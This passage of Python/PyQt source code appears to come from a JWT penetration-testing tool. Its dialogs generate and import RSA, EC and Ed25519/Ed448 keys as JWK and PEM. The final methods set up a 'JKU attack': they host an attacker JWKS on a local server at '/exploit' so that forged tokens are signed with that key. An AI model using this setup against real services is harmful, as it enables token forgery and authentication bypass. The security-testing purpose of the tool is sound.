        gen_form.addRow("Algorithm:", alg_cb)
        kid_gen_edit = QLineEdit(str(_uuid.uuid4()))
        kid_gen_edit.setStyleSheet(self._input_style())
        gen_form.addRow("Key ID (kid):", kid_gen_edit)
        gen_lay.addLayout(gen_form)
        note = QLabel("⚠  4096-bit generation may take a few seconds.")
        note.setStyleSheet(f"color:{COLOR_TEXT_MUTED}; font-size:8pt;")
        gen_lay.addWidget(note)
        gen_lay.addStretch()
        inner_tabs.addTab(gen_w, "Generate New")

        # ── Tab 2: Paste Existing ─────────────────────────────────────────
        paste_w = QWidget()
        paste_lay = QVBoxLayout(paste_w)
        paste_lay.setContentsMargins(8, 8, 8, 8)
        paste_lay.setSpacing(6)
        paste_form = QFormLayout()
        paste_form.setSpacing(6)
        paste_alg_cb = QComboBox()
        paste_alg_cb.addItems(["RS256", "RS384", "RS512", "PS256", "PS384", "PS512"])
        paste_alg_cb.setStyleSheet(self._input_style())
        paste_form.addRow("Algorithm:", paste_alg_cb)
        kid_paste_edit = QLineEdit(str(_uuid.uuid4()))
        kid_paste_edit.setStyleSheet(self._input_style())
        paste_form.addRow("Key ID (kid):", kid_paste_edit)
        paste_lay.addLayout(paste_form)
        paste_hint = QLabel(
            "Paste a PEM-encoded private key, public key, or RSA JWK below.\n"
            "Private key  →  both public & private stored.\n"
            "Public key only  →  stored without signing capability.\n"
            "JWK  →  paste the JSON object or JWKS {\"keys\":[…]}."
        )
        paste_hint.setStyleSheet(f"color:{COLOR_TEXT_MUTED}; font-size:8pt;")
        paste_hint.setWordWrap(True)
        paste_lay.addWidget(paste_hint)
        paste_edit = QPlainTextEdit()
        paste_edit.setPlaceholderText(
            "-----BEGIN RSA PRIVATE KEY-----\n...\n-----END RSA PRIVATE KEY-----\n\n"
            "or  -----BEGIN PUBLIC KEY-----  …\n\n"
            "or  {\"kty\":\"RSA\",\"n\":\"…\",\"e\":\"…\"}"
        )
        paste_edit.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 8))
        paste_edit.setStyleSheet(
            f"background:{COLOR_DARK_BG}; color:{COLOR_TEXT};"
            f" border:1px solid {COLOR_BORDER}; border-radius:3px;"
        )
        paste_edit.setMinimumHeight(130)
        paste_lay.addWidget(paste_edit)
        inner_tabs.addTab(paste_w, "Paste Existing Key")

        _lay.addWidget(inner_tabs, 1)

        btns = QHBoxLayout()
        ok_btn = QPushButton("OK")
        ok_btn.setStyleSheet(self._btn_style("#4A90D9"))
        ok_btn.clicked.connect(dlg.accept)
        cancel_btn = QPushButton("Cancel")
        cancel_btn.setStyleSheet(self._btn_style(COLOR_DARK_BG))
        cancel_btn.clicked.connect(dlg.reject)
        btns.addWidget(ok_btn)
        btns.addWidget(cancel_btn)
        _lay.addLayout(btns)

        if dlg.exec_() != QDialog.Accepted:
            return

        # ── Handle Paste Existing ─────────────────────────────────────────
        if inner_tabs.currentIndex() == 1:
            raw = paste_edit.toPlainText().strip()
            if not raw:
                QMessageBox.warning(self, "Empty Input", "No key material was pasted.")
                return
            alg  = paste_alg_cb.currentText()
            kid  = kid_paste_edit.text().strip() or str(_uuid.uuid4())
            try:
                from cryptography.hazmat.primitives import serialization as _ser
                from cryptography.hazmat.backends import default_backend

                def _i2b(n):
                    return _b64url_encode(n.to_bytes((n.bit_length() + 7) // 8, "big"))

                priv_key = None
                pub_key  = None
                _jwk_meta: dict = {}   # kid/alg/use preserved from a pasted JWK

                # Try JWK / JWKS JSON first
                if raw.lstrip().startswith("{") or raw.lstrip().startswith("["):
                    data = json.loads(raw)
                    # Support JWKS {"keys": [...]}
                    if isinstance(data, dict) and "keys" in data:
                        rsa_keys = [k for k in data["keys"] if k.get("kty") == "RSA"]
                        if not rsa_keys:
                            raise ValueError("No RSA keys found in JWKS")
                        data = rsa_keys[0]
                    # data is now a JWK dict
                    if data.get("kty") != "RSA":
                        raise ValueError("JWK is not RSA type")
                    # Preserve metadata fields from the pasted JWK
                    for _f in ("kid", "alg", "use", "x5t", "x5t#S256"):
                        if _f in data:
                            _jwk_meta[_f] = data[_f]
                    from cryptography.hazmat.primitives.asymmetric.rsa import (
                        RSAPublicNumbers, RSAPrivateNumbers, rsa_crt_iqmp, rsa_crt_dmp1, rsa_crt_dmq1
                    )
                    def _b2i(val):
                        padded = val + "=" * (-len(val) % 4)
                        return int.from_bytes(base64.urlsafe_b64decode(padded), "big")
                    n, e = _b2i(data["n"]), _b2i(data["e"])
                    pub_nums = RSAPublicNumbers(e, n)
                    if "d" in data:
                        d = _b2i(data["d"])
                        if "p" in data and "q" in data:
                            p, q = _b2i(data["p"]), _b2i(data["q"])
                        else:
                            # approximate p/q from d,e,n
                            raise ValueError("JWK missing p/q — import via 'Import JWK' button instead")
                        dp = _b2i(data["dp"]) if "dp" in data else rsa_crt_dmp1(d, p)
                        dq = _b2i(data["dq"]) if "dq" in data else rsa_crt_dmq1(d, q)
                        qi = _b2i(data["qi"]) if "qi" in data else rsa_crt_iqmp(p, q)
                        priv_nums = RSAPrivateNumbers(p, q, d, dp, dq, qi, pub_nums)
                        priv_key = priv_nums.private_key(default_backend())
                        pub_key  = priv_key.public_key()
                    else:
                        pub_key = pub_nums.public_key(default_backend())
                else:
                    # PEM path
                    raw_b = raw.encode()
                    # Try private key formats
                    for loader in (
                        lambda b: _ser.load_pem_private_key(b, password=None, backend=default_backend()),
                    ):
                        try:
                            priv_key = loader(raw_b)
                            pub_key  = priv_key.public_key()
                            break
                        except Exception:
                            pass
                    # Try public key if private failed
                    if pub_key is None:
                        try:
                            pub_key = _ser.load_pem_public_key(raw_b, backend=default_backend())
                        except Exception:
                            pass
                    if pub_key is None:
                        raise ValueError(
                            "Could not parse key — ensure it is a valid PEM or JWK RSA key."
                        )

                # Prefer values from the pasted JWK; fall back to dialog fields
                _eff_kid = _jwk_meta.get("kid", kid)
                _eff_alg = _jwk_meta.get("alg", alg)
                _eff_use = _jwk_meta.get("use", "sig")

                pn = pub_key.public_numbers()
                pub_jwk = {
                    "kty": "RSA", "alg": _eff_alg, "use": _eff_use, "kid": _eff_kid,
                    "n": _i2b(pn.n), "e": _i2b(pn.e),
                }
                priv_jwk = None
                pem_priv = "(not available — public key only)"
                if priv_key is not None:
                    privn = priv_key.private_numbers()
                    priv_jwk = dict(pub_jwk)
                    priv_jwk.update({
                        "d":  _i2b(privn.d),   "p":  _i2b(privn.p),
                        "q":  _i2b(privn.q),   "dp": _i2b(privn.dmp1),
                        "dq": _i2b(privn.dmq1), "qi": _i2b(privn.iqmp),
                    })
                    pem_priv = priv_key.private_bytes(
                        _ser.Encoding.PEM, _ser.PrivateFormat.TraditionalOpenSSL,
                        _ser.NoEncryption()
                    ).decode()
                pem_pub = pub_key.public_bytes(
                    _ser.Encoding.PEM, _ser.PublicFormat.SubjectPublicKeyInfo
                ).decode()
                bits = pn.n.bit_length()
                key_data = {
                    "_type": "RSA", "_size": f"{bits}-bit",
                    "kty": "RSA", "alg": _eff_alg, "kid": _eff_kid,
                    "_pub_jwk": pub_jwk, "_priv_jwk": priv_jwk,
                    "_pem_pub": pem_pub, "_pem_priv": pem_priv,
                }
                label = "private+public" if priv_key else "public only"
                if self._km_key_preview_and_save(key_data):
                    self._set_status(
                        f"Imported RSA-{bits} key ({label})  kid={key_data['kid']}", COLOR_SUCCESS
                    )
            except Exception as exc:
                QMessageBox.warning(self, "Import Failed", str(exc))
            return

        # ── Handle Generate New ───────────────────────────────────────────
        key_size = int(size_cb.currentText())
        alg = alg_cb.currentText()
        kid = kid_gen_edit.text().strip() or str(_uuid.uuid4())
        try:
            from cryptography.hazmat.primitives.asymmetric import rsa as _rsa
            from cryptography.hazmat.primitives import serialization as _ser
            from cryptography.hazmat.backends import default_backend
            priv = _rsa.generate_private_key(
                public_exponent=65537, key_size=key_size, backend=default_backend()
            )
            pub = priv.public_key()
            pn = pub.public_numbers()
            privn = priv.private_numbers()
            def _i2b(n):
                return _b64url_encode(n.to_bytes((n.bit_length() + 7) // 8, "big"))
            pub_jwk = {"kty": "RSA", "alg": alg, "use": "sig", "kid": kid,
                       "n": _i2b(pn.n), "e": _i2b(pn.e)}
            priv_jwk = dict(pub_jwk)
            priv_jwk.update({"d": _i2b(privn.d), "p": _i2b(privn.p), "q": _i2b(privn.q),
                             "dp": _i2b(privn.dmp1), "dq": _i2b(privn.dmq1), "qi": _i2b(privn.iqmp)})
            pem_pub = pub.public_bytes(
                _ser.Encoding.PEM, _ser.PublicFormat.SubjectPublicKeyInfo
            ).decode()
            pem_priv = priv.private_bytes(
                _ser.Encoding.PEM, _ser.PrivateFormat.TraditionalOpenSSL, _ser.NoEncryption()
            ).decode()
            key_data = {
                "_type": "RSA", "_size": f"{key_size}-bit",
                "kty": "RSA", "alg": alg, "kid": kid,
                "_pub_jwk": pub_jwk, "_priv_jwk": priv_jwk,
                "_pem_pub": pem_pub, "_pem_priv": pem_priv,
            }
            if self._km_key_preview_and_save(key_data):
                self._set_status(f"Generated RSA-{key_size} key  kid={key_data['kid']}", COLOR_SUCCESS)
        except ImportError:
            QMessageBox.warning(self, "Missing Dependency",
                "RSA key generation requires the 'cryptography' package.\n"
                "Install with:  pip install cryptography")

    def _km_generate_ec(self):
        """Generate or import an Elliptic Curve key pair."""
        import uuid as _uuid
        dlg = QDialog(self)
        dlg.setWindowTitle("New EC Key")
        dlg.setModal(True)
        dlg.setMinimumWidth(480)
        dlg.setMinimumHeight(340)
        _lay = QVBoxLayout(dlg)
        _lay.setSpacing(6)

        inner_tabs = QTabWidget()
        inner_tabs.setDocumentMode(True)
        inner_tabs.setStyleSheet(self._subtabs_style())

        # ── Tab 1: Generate ───────────────────────────────────────────────
        gen_w = QWidget()
        gen_lay = QVBoxLayout(gen_w)
        gen_lay.setContentsMargins(8, 8, 8, 8)
        gen_form = QFormLayout()
        gen_form.setSpacing(6)
        curve_cb = QComboBox()
        curve_cb.addItems(["P-256  (ES256)", "P-384  (ES384)", "P-521  (ES512)"])
        curve_cb.setStyleSheet(self._input_style())
        gen_form.addRow("Curve:", curve_cb)
        kid_edit = QLineEdit(str(_uuid.uuid4()))
        kid_edit.setStyleSheet(self._input_style())
        gen_form.addRow("Key ID (kid):", kid_edit)
        gen_lay.addLayout(gen_form)
        gen_lay.addStretch()
        inner_tabs.addTab(gen_w, "Generate New")

        # ── Tab 2: Paste existing ─────────────────────────────────────────
        paste_w = QWidget()
        paste_lay = QVBoxLayout(paste_w)
        paste_lay.setContentsMargins(8, 8, 8, 8)
        paste_lay.setSpacing(6)
        paste_form = QFormLayout()
        paste_form.setSpacing(6)
        paste_alg_cb = QComboBox()
        paste_alg_cb.addItems(["ES256", "ES384", "ES512"])
        paste_alg_cb.setStyleSheet(self._input_style())
        paste_form.addRow("Algorithm:", paste_alg_cb)
        paste_kid_edit = QLineEdit(str(_uuid.uuid4()))
        paste_kid_edit.setStyleSheet(self._input_style())
        paste_form.addRow("Key ID (kid):", paste_kid_edit)
        paste_lay.addLayout(paste_form)
        paste_hint = QLabel(
            "Paste a PEM-encoded EC private or public key, or an EC JWK / JWKS below."
        )
        paste_hint.setStyleSheet(f"color:{COLOR_TEXT_MUTED}; font-size:8pt;")
        paste_hint.setWordWrap(True)
        paste_lay.addWidget(paste_hint)
        paste_edit = QPlainTextEdit()
        paste_edit.setPlaceholderText(
            "-----BEGIN EC PRIVATE KEY-----\n...\n-----END EC PRIVATE KEY-----\n\n"
            "or  {\"kty\":\"EC\",\"crv\":\"P-256\",\"x\":\"…\",\"y\":\"…\",\"d\":\"…\"}"
        )
        paste_edit.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 8))
        paste_edit.setStyleSheet(
            f"background:{COLOR_DARK_BG}; color:{COLOR_TEXT};"
            f" border:1px solid {COLOR_BORDER}; border-radius:3px;"
        )
        paste_edit.setMinimumHeight(120)
        paste_lay.addWidget(paste_edit)
        inner_tabs.addTab(paste_w, "Paste Existing Key")

        _lay.addWidget(inner_tabs, 1)

        btns = QHBoxLayout()
        ok_btn = QPushButton("OK")
        ok_btn.setStyleSheet(self._btn_style("#7B5EA7"))
        ok_btn.clicked.connect(dlg.accept)
        cancel_btn = QPushButton("Cancel")
        cancel_btn.setStyleSheet(self._btn_style(COLOR_DARK_BG))
        cancel_btn.clicked.connect(dlg.reject)
        btns.addWidget(ok_btn)
        btns.addWidget(cancel_btn)
        _lay.addLayout(btns)

        if dlg.exec_() != QDialog.Accepted:
            return

        # ── Paste path ────────────────────────────────────────────────────
        if inner_tabs.currentIndex() == 1:
            raw_text = paste_edit.toPlainText().strip()
            if not raw_text:
                QMessageBox.warning(self, "Empty Input", "No key material was pasted.")
                return
            alg = paste_alg_cb.currentText()
            kid = paste_kid_edit.text().strip() or str(_uuid.uuid4())
            try:
                from cryptography.hazmat.primitives import serialization as _ser
                from cryptography.hazmat.backends import default_backend
                from cryptography.hazmat.primitives.asymmetric import ec as _ec

                priv_key = None
                pub_key  = None
                _jwk_meta: dict = {}

                if raw_text.lstrip().startswith("{") or raw_text.lstrip().startswith("["):
                    data = json.loads(raw_text)
                    if isinstance(data, dict) and "keys" in data:
                        ec_keys = [k for k in data["keys"] if k.get("kty") == "EC"]
                        if not ec_keys:
                            raise ValueError("No EC keys found in JWKS")
                        data = ec_keys[0]
                    if data.get("kty") != "EC":
                        raise ValueError("JWK is not EC type")
                    for _f in ("kid", "alg", "use", "crv"):
                        if _f in data:
                            _jwk_meta[_f] = data[_f]
                    _crv_map = {"P-256": _ec.SECP256R1(), "P-384": _ec.SECP384R1(), "P-521": _ec.SECP521R1()}
                    _crv = data.get("crv", "P-256")
                    _curve_obj = _crv_map.get(_crv, _ec.SECP256R1())
                    def _b2i(val):
                        padded = val + "=" * (-len(val) % 4)
                        return int.from_bytes(base64.urlsafe_b64decode(padded), "big")
                    x  = _b2i(data["x"]); y = _b2i(data["y"])
                    pub_nums = _ec.EllipticCurvePublicNumbers(x, y, _curve_obj)
                    if "d" in data:
                        d = _b2i(data["d"])
                        priv_nums = _ec.EllipticCurvePrivateNumbers(d, pub_nums)
                        priv_key  = priv_nums.private_key(default_backend())
                        pub_key   = priv_key.public_key()
                    else:
                        pub_key = pub_nums.public_key(default_backend())
                else:
                    raw_b = raw_text.encode()
                    try:
                        priv_key = _ser.load_pem_private_key(raw_b, password=None, backend=default_backend())
                        pub_key  = priv_key.public_key()
                    except Exception:
                        priv_key = None
                    if pub_key is None:
                        try:
                            pub_key = _ser.load_pem_public_key(raw_b, backend=default_backend())
                        except Exception:
                            pass
                    if pub_key is None:
                        raise ValueError("Could not parse EC key — provide a valid PEM or JWK.")

                _eff_kid = _jwk_meta.get("kid", kid)
                _eff_alg = _jwk_meta.get("alg", alg)
                _eff_crv = getattr(pub_key.curve, "name", _jwk_meta.get("crv", "P-256")) if hasattr(pub_key, "curve") else _jwk_meta.get("crv", "P-256")
                _crv_name_map = {"secp256r1": "P-256", "secp384r1": "P-384", "secp521r1": "P-521"}
                _eff_crv = _crv_name_map.get(_eff_crv, _eff_crv)
                _coord_len_map = {"P-256": 32, "P-384": 48, "P-521": 66}
                _coord_len = _coord_len_map.get(_eff_crv, 32)

                def _i2b(n):
                    return _b64url_encode(n.to_bytes(_coord_len, "big"))

                pn = pub_key.public_numbers()
                pub_jwk = {
                    "kty": "EC", "crv": _eff_crv, "alg": _eff_alg,
                    "use": "sig", "kid": _eff_kid,
                    "x": _i2b(pn.x), "y": _i2b(pn.y),
                }
                priv_jwk = None
                pem_priv = "(not available — public key only)"
                if priv_key is not None:
                    privn = priv_key.private_numbers()
                    priv_jwk = dict(pub_jwk)
                    priv_jwk["d"] = _i2b(privn.private_value)
                    pem_priv = priv_key.private_bytes(
                        _ser.Encoding.PEM, _ser.PrivateFormat.TraditionalOpenSSL, _ser.NoEncryption()
                    ).decode()
                pem_pub = pub_key.public_bytes(
                    _ser.Encoding.PEM, _ser.PublicFormat.SubjectPublicKeyInfo
                ).decode()
                key_data = {
                    "_type": "EC", "_size": _eff_crv,
                    "kty": "EC", "crv": _eff_crv, "alg": _eff_alg, "kid": _eff_kid,
                    "_pub_jwk": pub_jwk, "_priv_jwk": priv_jwk,
                    "_pem_pub": pem_pub, "_pem_priv": pem_priv,
                }
                label = "private+public" if priv_key else "public only"
                if self._km_key_preview_and_save(key_data):
                    self._set_status(
                        f"Imported EC {_eff_crv} key ({label})  kid={key_data['kid']}", COLOR_SUCCESS
                    )
            except ImportError:
                QMessageBox.warning(self, "Missing Dependency",
                    "EC key import requires the 'cryptography' package.\n"
                    "Install with:  pip install cryptography")
            except Exception as exc:
                QMessageBox.warning(self, "Import Failed", str(exc))
            return

        # ── Generate path ─────────────────────────────────────────────────
        crv_map  = {0: ("P-256", "ES256", 32), 1: ("P-384", "ES384", 48), 2: ("P-521", "ES512", 66)}
        crv, alg, coord_len = crv_map[curve_cb.currentIndex()]
        kid = kid_edit.text().strip() or str(_uuid.uuid4())
        try:
            from cryptography.hazmat.primitives.asymmetric import ec as _ec
            from cryptography.hazmat.primitives import serialization as _ser
            from cryptography.hazmat.backends import default_backend
            _curve_obj = {"P-256": _ec.SECP256R1(), "P-384": _ec.SECP384R1(), "P-521": _ec.SECP521R1()}[crv]
            priv = _ec.generate_private_key(_curve_obj, default_backend())
            pub = priv.public_key()
            pn = pub.public_numbers()
            def _i2b(n):
                return _b64url_encode(n.to_bytes(coord_len, "big"))
            pub_jwk = {"kty": "EC", "crv": crv, "alg": alg, "use": "sig", "kid": kid,
                       "x": _i2b(pn.x), "y": _i2b(pn.y)}
            priv_jwk = dict(pub_jwk)
            priv_jwk["d"] = _i2b(priv.private_numbers().private_value)
            pem_pub = pub.public_bytes(
                _ser.Encoding.PEM, _ser.PublicFormat.SubjectPublicKeyInfo
            ).decode()
            pem_priv = priv.private_bytes(
                _ser.Encoding.PEM, _ser.PrivateFormat.TraditionalOpenSSL, _ser.NoEncryption()
            ).decode()
            key_data = {
                "_type": "EC", "_size": crv,
                "kty": "EC", "crv": crv, "alg": alg, "kid": kid,
                "_pub_jwk": pub_jwk, "_priv_jwk": priv_jwk,
                "_pem_pub": pem_pub, "_pem_priv": pem_priv,
            }
            if self._km_key_preview_and_save(key_data):
                self._set_status(f"Generated EC {crv} key  kid={key_data['kid']}", COLOR_SUCCESS)
        except ImportError:
            QMessageBox.warning(self, "Missing Dependency",
                "EC key generation requires the 'cryptography' package.\n"
                "Install with:  pip install cryptography")

    def _km_generate_okp(self):
        """Generate or import an OKP key (Ed25519 or Ed448)."""
        import uuid as _uuid
        dlg = QDialog(self)
        dlg.setWindowTitle("New OKP Key")
        dlg.setModal(True)
        dlg.setMinimumWidth(480)
        dlg.setMinimumHeight(340)
        _lay = QVBoxLayout(dlg)
        _lay.setSpacing(6)

        inner_tabs = QTabWidget()
        inner_tabs.setDocumentMode(True)
        inner_tabs.setStyleSheet(self._subtabs_style())

        # ── Tab 1: Generate ───────────────────────────────────────────────
        gen_w = QWidget()
        gen_lay = QVBoxLayout(gen_w)
        gen_lay.setContentsMargins(8, 8, 8, 8)
        gen_form = QFormLayout()
        gen_form.setSpacing(6)
        crv_cb = QComboBox()
        crv_cb.addItems(["Ed25519", "Ed448"])
        crv_cb.setStyleSheet(self._input_style())
        gen_form.addRow("Curve:", crv_cb)
        kid_edit = QLineEdit(str(_uuid.uuid4()))
        kid_edit.setStyleSheet(self._input_style())
        gen_form.addRow("Key ID (kid):", kid_edit)
        gen_lay.addLayout(gen_form)
        gen_lay.addStretch()
        inner_tabs.addTab(gen_w, "Generate New")

        # ── Tab 2: Paste existing ─────────────────────────────────────────
        paste_w = QWidget()
        paste_lay = QVBoxLayout(paste_w)
        paste_lay.setContentsMargins(8, 8, 8, 8)
        paste_lay.setSpacing(6)
        paste_form = QFormLayout()
        paste_form.setSpacing(6)
        paste_crv_cb = QComboBox()
        paste_crv_cb.addItems(["Ed25519", "Ed448"])
        paste_crv_cb.setStyleSheet(self._input_style())
        paste_form.addRow("Curve:", paste_crv_cb)
        paste_kid_edit = QLineEdit(str(_uuid.uuid4()))
        paste_kid_edit.setStyleSheet(self._input_style())
        paste_form.addRow("Key ID (kid):", paste_kid_edit)
        paste_lay.addLayout(paste_form)
        paste_hint = QLabel(
            "Paste a PEM-encoded OKP private or public key, or an OKP JWK / JWKS below."
        )
        paste_hint.setStyleSheet(f"color:{COLOR_TEXT_MUTED}; font-size:8pt;")
        paste_hint.setWordWrap(True)
        paste_lay.addWidget(paste_hint)
        paste_edit = QPlainTextEdit()
        paste_edit.setPlaceholderText(
            "-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----\n\n"
            "or  {\"kty\":\"OKP\",\"crv\":\"Ed25519\",\"x\":\"…\",\"d\":\"…\"}"
        )
        paste_edit.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 8))
        paste_edit.setStyleSheet(
            f"background:{COLOR_DARK_BG}; color:{COLOR_TEXT};"
            f" border:1px solid {COLOR_BORDER}; border-radius:3px;"
        )
        paste_edit.setMinimumHeight(120)
        paste_lay.addWidget(paste_edit)
        inner_tabs.addTab(paste_w, "Paste Existing Key")

        _lay.addWidget(inner_tabs, 1)

        btns = QHBoxLayout()
        ok_btn = QPushButton("OK")
        ok_btn.setStyleSheet(self._btn_style("#2E8B57"))
        ok_btn.clicked.connect(dlg.accept)
        cancel_btn = QPushButton("Cancel")
        cancel_btn.setStyleSheet(self._btn_style(COLOR_DARK_BG))
        cancel_btn.clicked.connect(dlg.reject)
        btns.addWidget(ok_btn)
        btns.addWidget(cancel_btn)
        _lay.addLayout(btns)

        if dlg.exec_() != QDialog.Accepted:
            return

        # ── Paste path ────────────────────────────────────────────────────
        if inner_tabs.currentIndex() == 1:
            raw_text = paste_edit.toPlainText().strip()
            if not raw_text:
                QMessageBox.warning(self, "Empty Input", "No key material was pasted.")
                return
            crv  = paste_crv_cb.currentText()
            kid  = paste_kid_edit.text().strip() or str(_uuid.uuid4())
            try:
                from cryptography.hazmat.primitives import serialization as _ser
                from cryptography.hazmat.backends import default_backend

                priv_key = None
                pub_key  = None
                _jwk_meta: dict = {}

                if raw_text.lstrip().startswith("{") or raw_text.lstrip().startswith("["):
                    data = json.loads(raw_text)
                    if isinstance(data, dict) and "keys" in data:
                        okp_keys = [k for k in data["keys"] if k.get("kty") == "OKP"]
                        if not okp_keys:
                            raise ValueError("No OKP keys found in JWKS")
                        data = okp_keys[0]
                    if data.get("kty") != "OKP":
                        raise ValueError("JWK is not OKP type")
                    for _f in ("kid", "alg", "use", "crv"):
                        if _f in data:
                            _jwk_meta[_f] = data[_f]
                    crv = _jwk_meta.get("crv", crv)
                    x_bytes = _b64url_decode(data["x"])
                    if "d" in data:
                        d_bytes = _b64url_decode(data["d"])
                        if crv == "Ed25519":
                            from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
                            priv_key = Ed25519PrivateKey.from_private_bytes(d_bytes)
                        else:
                            from cryptography.hazmat.primitives.asymmetric.ed448 import Ed448PrivateKey
                            priv_key = Ed448PrivateKey.from_private_bytes(d_bytes)
                        pub_key = priv_key.public_key()
                    else:
                        if crv == "Ed25519":
                            from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PublicKey
                            pub_key = Ed25519PublicKey.from_public_bytes(x_bytes)
                        else:
                            from cryptography.hazmat.primitives.asymmetric.ed448 import Ed448PublicKey
                            pub_key = Ed448PublicKey.from_public_bytes(x_bytes)
                else:
                    raw_b = raw_text.encode()
                    try:
                        priv_key = _ser.load_pem_private_key(raw_b, password=None, backend=default_backend())
                        pub_key  = priv_key.public_key()
                    except Exception:
                        priv_key = None
                    if pub_key is None:
                        try:
                            pub_key = _ser.load_pem_public_key(raw_b, backend=default_backend())
                        except Exception:
                            pass
                    if pub_key is None:
                        raise ValueError("Could not parse OKP key — provide a valid PEM or JWK.")

                _eff_kid = _jwk_meta.get("kid", kid)
                pub_raw  = pub_key.public_bytes_raw()
                pub_jwk  = {"kty": "OKP", "crv": crv, "alg": "EdDSA", "use": "sig",
                            "kid": _eff_kid, "x": _b64url_encode(pub_raw)}
                priv_jwk = None
                pem_priv = "(not available — public key only)"
                if priv_key is not None:
                    priv_raw  = priv_key.private_bytes_raw()
                    priv_jwk  = dict(pub_jwk)
                    priv_jwk["d"] = _b64url_encode(priv_raw)
                    pem_priv  = priv_key.private_bytes(
                        _ser.Encoding.PEM, _ser.PrivateFormat.PKCS8, _ser.NoEncryption()
                    ).decode()
                pem_pub = pub_key.public_bytes(
                    _ser.Encoding.PEM, _ser.PublicFormat.SubjectPublicKeyInfo
                ).decode()
                key_data = {
                    "_type": "OKP", "_size": crv,
                    "kty": "OKP", "crv": crv, "alg": "EdDSA", "kid": _eff_kid,
                    "_pub_jwk": pub_jwk, "_priv_jwk": priv_jwk,
                    "_pem_pub": pem_pub, "_pem_priv": pem_priv,
                }
                label = "private+public" if priv_key else "public only"
                if self._km_key_preview_and_save(key_data):
                    self._set_status(
                        f"Imported OKP {crv} key ({label})  kid={key_data['kid']}", COLOR_SUCCESS
                    )
            except (ImportError, AttributeError):
                QMessageBox.warning(self, "Missing Dependency",
                    "OKP key import requires the 'cryptography' package (≥ 2.6).\n"
                    "Install with:  pip install cryptography")
            except Exception as exc:
                QMessageBox.warning(self, "Import Failed", str(exc))
            return

        # ── Generate path ─────────────────────────────────────────────────
        crv = crv_cb.currentText()
        kid = kid_edit.text().strip() or str(_uuid.uuid4())
        try:
            from cryptography.hazmat.primitives import serialization as _ser
            if crv == "Ed25519":
                from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
                priv = Ed25519PrivateKey.generate()
            else:
                from cryptography.hazmat.primitives.asymmetric.ed448 import Ed448PrivateKey
                priv = Ed448PrivateKey.generate()
            pub = priv.public_key()
            pub_raw  = pub.public_bytes_raw()
            priv_raw = priv.private_bytes_raw()
            pub_jwk  = {"kty": "OKP", "crv": crv, "alg": "EdDSA", "use": "sig", "kid": kid,
                        "x": _b64url_encode(pub_raw)}
            priv_jwk = dict(pub_jwk)
            priv_jwk["d"] = _b64url_encode(priv_raw)
            pem_pub  = pub.public_bytes(_ser.Encoding.PEM, _ser.PublicFormat.SubjectPublicKeyInfo).decode()
            pem_priv = priv.private_bytes(_ser.Encoding.PEM, _ser.PrivateFormat.PKCS8,
                                          _ser.NoEncryption()).decode()
            key_data = {
                "_type": "OKP", "_size": crv,
                "kty": "OKP", "crv": crv, "alg": "EdDSA", "kid": kid,
                "_pub_jwk": pub_jwk, "_priv_jwk": priv_jwk,
                "_pem_pub": pem_pub, "_pem_priv": pem_priv,
            }
            if self._km_key_preview_and_save(key_data):
                self._set_status(f"Generated OKP {crv} key  kid={key_data['kid']}", COLOR_SUCCESS)
        except (ImportError, AttributeError):
            QMessageBox.warning(self, "Missing Dependency",
                "OKP key generation requires the 'cryptography' package (≥ 2.6).\n"
                "Install with:  pip install cryptography")

    def _km_on_key_selected(self):
        """Populate detail views when a key row is clicked."""
        idx = self.km_table.currentRow()
        if idx < 0 or idx >= len(self._managed_keys):
            return
        key = self._managed_keys[idx]
        self.km_jwk_pub_view.setPlainText(json.dumps(key.get("_pub_jwk", {}), indent=2))
        self.km_jwk_priv_view.setPlainText(json.dumps(key.get("_priv_jwk", {}), indent=2))
        self.km_pem_pub_view.setPlainText(key.get("_pem_pub", ""))
        self.km_pem_priv_view.setPlainText(key.get("_pem_priv", ""))
        # JWKS-to-Host: minimal public fields only (kty/kid/n/e) — exactly what servers expect
        pub_jwk = key.get("_pub_jwk", {})
        if pub_jwk:
            minimal = {k: pub_jwk[k] for k in ("kty", "kid", "n", "e") if k in pub_jwk}
            self.km_jwks_host_view.setPlainText(
                json.dumps({"keys": [minimal]}, indent=2)
            )
        else:
            self.km_jwks_host_view.setPlainText("(no public key available)")
        _type = key.get("_type", "")
        if _type == "RSA":
            self._set_status(
                f"Key selected for JKU attack: {_type} kid={key.get('kid','')}  "
                "— copy JWKS to host, then build token below.",
                COLOR_ACCENT
            )
        # If a local JWKS server is running, hot-update it with the minimal key
        if self._local_jwks_server and self._local_jwks_server.isRunning() and pub_jwk:
            minimal_json = json.dumps({"keys": [minimal]}, indent=2) if pub_jwk else "{\"keys\":[]}"
            self._local_jwks_server.set_jwks(minimal_json)
            self._srv_key_data = key  # keep in sync so the Analyzer signs with this key
            self.km_srv_log.append(
                f"[{__import__('datetime').datetime.now().strftime('%H:%M:%S')}]"
                f"  — JWKS updated on running server (kid={key.get('kid', '')})"
            )

    # ─────────────────────────────────────────────────────────────────────
    # Local JWKS Server slots
    # ─────────────────────────────────────────────────────────────────────

    def _km_srv_start(self):
        """Start the local JWKS HTTP server, serving the selected key's JWKS."""
        idx = self.km_table.currentRow()
        if idx < 0 or idx >= len(self._managed_keys):
            # No key selected — start with an empty JWKS and warn the user
            ret = QMessageBox.question(
                self, "No Key Selected",
                "No key is selected. Start server with an empty JWKS?\n\n"
                "Select an RSA key first for a useful JKU attack.",
                QMessageBox.Yes | QMessageBox.No, QMessageBox.No,
            )
            if ret != QMessageBox.Yes:
                return
            jwks_json = json.dumps({"keys": []}, indent=2)
        else:
            key = self._managed_keys[idx]
            pub_jwk = key.get("_pub_jwk", {})
            if not pub_jwk:
                QMessageBox.warning(self, "No Public Key",
                    "The selected key has no exportable public JWK.")
                return
            # Minimal JWKS (kty/kid/n/e only) — consistent with forge_jku_injection
            minimal_pub = {k: pub_jwk[k] for k in ("kty", "kid", "n", "e") if k in pub_jwk}
            jwks_json = json.dumps({"keys": [minimal_pub]}, indent=2)

        port = self.km_srv_port.value()
        path = self.km_srv_path.text().strip() or "/exploit"
        if not path.startswith("/"):
            path = "/" + path

        # Remember which key the server is hosting so the Analyzer can sign with it
